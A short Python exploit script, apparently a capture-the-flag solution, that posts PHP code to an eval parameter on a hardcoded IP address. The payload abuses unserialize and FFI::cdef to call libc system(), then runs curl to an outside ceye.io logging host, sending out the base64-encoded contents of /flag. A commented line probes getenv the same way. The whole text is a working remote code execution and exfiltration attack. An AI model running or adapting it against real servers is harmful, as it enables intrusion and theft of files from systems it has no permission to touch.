# -*- coding: utf-8 -*-
import requests

url = "http://39.108.36.103:8002/?a=eval($_POST[\"b\"]);"

payload = '''
$a = unserialize('C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}')->ret->system("curl http://lekg1p.ceye.io?/`cat /flag|base64`");
var_dump($a);
'''

data1 = {'b':payload}
print data1
r = requests.post(url,data=data1)
print r.text
#var_dump(unserialize('C:1:"A":97:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:34:"const char * getenv(const char *);";}}')->ret->getenv('PATH'));